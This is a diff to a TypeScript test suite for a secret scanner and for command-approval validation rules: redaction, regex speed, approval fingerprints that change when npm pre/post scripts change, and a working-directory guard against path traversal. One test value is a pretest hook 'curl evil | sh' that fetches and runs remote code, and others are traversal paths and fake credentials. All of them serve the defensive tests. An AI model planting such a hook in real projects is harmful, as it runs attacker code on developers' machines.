@@ -1,6 +1,7 @@
 import * as assert from 'assert';
 import { redact, scanSecrets } from '../../core/rules/secrets';
-import { approvalFingerprint, detectPresets, normaliseRules, packageScriptOf } from '../../core/rules/validations';
+import { approvalFingerprint, detectPresets, normaliseRules, packageScriptOf, resolvedScripts, safeCwd } from '../../core/rules/validations';
+import * as path from 'path';
 
 describe('secret scanner (Pro)', () => {
   it('finds common token shapes in added lines and redacts them', () => {
@@ -30,9 +31,18 @@ describe('secret scanner (Pro)', () => {
     assert.strictEqual(redact('short'), '****');
     assert.strictEqual(redact('ABCDEFGHIJKLMNOP'), 'ABCD…NOP (16 chars)');
   });
-  it('one finding per line, skips very long lines', () => {
+  it('one finding per line, skips very long lines, stays fast on pathological input', () => {
     const f = scanSecrets([{ line: 1, text: 'x'.repeat(5000) + ' ghp_' + 'a'.repeat(40) }]);
     assert.strictEqual(f.length, 0);
+    const t0 = Date.now();
+    scanSecrets(Array.from({ length: 300 }, (_, i) => ({ line: i, text: 'ab-'.repeat(330) })));
+    assert.ok(Date.now() - t0 < 500, `pathological lines must not stall the host (${Date.now() - t0} ms)`);
+    // labels: Anthropic before OpenAI; assignments without quotes / with prefixes; sk- slug is not a key
+    const ids = (t: string) => scanSecrets([{ line: 1, text: t }]).map((x) => x.patternId);
+    assert.deepStrictEqual(ids('KEY=sk-ant-' + 'a'.repeat(40)), ['anthropic-key']);
+    assert.deepStrictEqual(ids('DB_PASSWORD=Sup3rS3cretValue123'), ['generic-assignment']);
+    assert.deepStrictEqual(ids('"password": "Sup3rS3cretValue123"'), ['generic-assignment']);
+    assert.deepStrictEqual(ids('const sk = "sk-my-super-long-variable-name-that-is-not-a-key";'), []);
   });
 });
 
@@ -60,6 +70,19 @@ describe('validation rules (Pro)', () => {
     assert.notStrictEqual(a, approvalFingerprint(r, 'eslint src', 'folder2'));
     assert.notStrictEqual(a, approvalFingerprint({ ...r, cwd: 'packages/a' }, 'eslint src', 'folder1'));
     assert.notStrictEqual(a, approvalFingerprint({ ...r, command: 'npm run lint -- --fix' }, 'eslint src', 'folder1'));
+    // trigger changes (manual → automatic) invalidate the approval too
+    assert.notStrictEqual(a, approvalFingerprint({ ...r, runOn: 'afterReview' }, 'eslint src', 'folder1'));
+    // pre/post scripts are part of what npm runs
+    const base = resolvedScripts({ test: 'mocha' }, 'test');
+    assert.strictEqual(base, JSON.stringify({ test: 'mocha' }));
+    assert.notStrictEqual(base, resolvedScripts({ pretest: 'curl evil | sh', test: 'mocha' }, 'test'), 'an added pretest changes the resolved script');
+    assert.strictEqual(resolvedScripts({}, 'test'), '<missing script test>');
+    // cwd must stay inside the folder
+    const inside = (b: string, p: string) => { const rel = path.relative(b, p); return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel)); };
+    assert.strictEqual(safeCwd('/w', undefined, path.posix.join, inside), '/w');
+    assert.strictEqual(safeCwd('/w', 'packages/a', path.posix.join, inside), '/w/packages/a');
+    assert.strictEqual(safeCwd('/w', '../..', path.posix.join, inside), undefined);
+    assert.strictEqual(safeCwd('/w', 'a/../../x', path.posix.join, inside), undefined);
   });
   it('detects presets from project files', () => {
     const p = detectPresets({ packageJson: { scripts: { lint: 'eslint .', test: 'mocha', build: 'tsc' } }, files: ['tsconfig.json', 'go.mod'] });
